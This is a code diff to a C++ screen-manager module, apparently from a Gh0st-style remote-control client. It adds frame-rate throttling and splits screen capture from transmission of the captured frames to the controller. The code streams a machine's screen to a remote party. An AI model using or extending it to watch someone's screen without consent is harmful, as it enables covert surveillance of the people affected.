@@ -11,6 +11,7 @@
 #else
 #include <WinUser.h>
 #endif
+#include <time.h>
 using namespace std;
 
 //////////////////////////////////////////////////////////////////////
@@ -44,10 +45,25 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 
 	This->WaitForDialogOpen();   
 
-	This->SendFirstScreen();         
+	clock_t last = clock();
+	This->SendFirstScreen();
+	const int fps = 8;// 帧率
+	const int sleep = 1000 / fps;// 间隔时间（ms）
 	while (This->m_bIsWorking)
 	{
-		This->SendNextScreen();
+		ULONG ulNextSendLength = 0;
+		const char*	szBuffer = This->GetNextScreen(ulNextSendLength);
+		if (szBuffer)
+		{
+			int span = sleep-(clock() - last);
+			Sleep(span > 0 ? span : 1);
+			if (span < 0)
+				printf("SendScreen Span = %d ms\n", span);
+			last = clock();
+			This->SendNextScreen(szBuffer, ulNextSendLength);
+			delete[] szBuffer;
+			szBuffer = NULL;
+		}
 	}
 
 	cout<<"ScreenWorkThread Exit"<<endl;
@@ -196,35 +212,30 @@ VOID CScreenManager::SendFirstScreen()
 	szBuffer = NULL;
 }
 
-
-VOID CScreenManager::SendNextScreen()
+const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
 {
 	//得到数据，得到数据大小，然后发送
 	//我们到getNextScreen函数的定义 
-	LPVOID	NextScreenData = NULL;
-	ULONG	ulNextSendLength = 0;
-	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);
+	LPVOID	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);
 
-	if (ulNextSendLength == 0 || NextScreenData==NULL)
-	{		
-		return;
+	if (ulNextSendLength == 0 || NextScreenData == NULL)
+	{
+		return NULL;
 	}
 
 	ulNextSendLength += 1;
 
-	LPBYTE	szBuffer = new BYTE[ulNextSendLength];
-	if (szBuffer == NULL)
-	{
-		return;
-	}
+	char*	szBuffer = new char[ulNextSendLength];
 
 	szBuffer[0] = TOKEN_NEXTSCREEN;
 	memcpy(szBuffer + 1, NextScreenData, ulNextSendLength - 1);
 
-	m_ClientObject->OnServerSending((char*)szBuffer, ulNextSendLength);
+	return szBuffer;
+}
 
-	delete [] szBuffer;
-	szBuffer = NULL;
+VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength)
+{
+	m_ClientObject->OnServerSending(szBuffer, ulNextSendLength);
 }
 
 VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
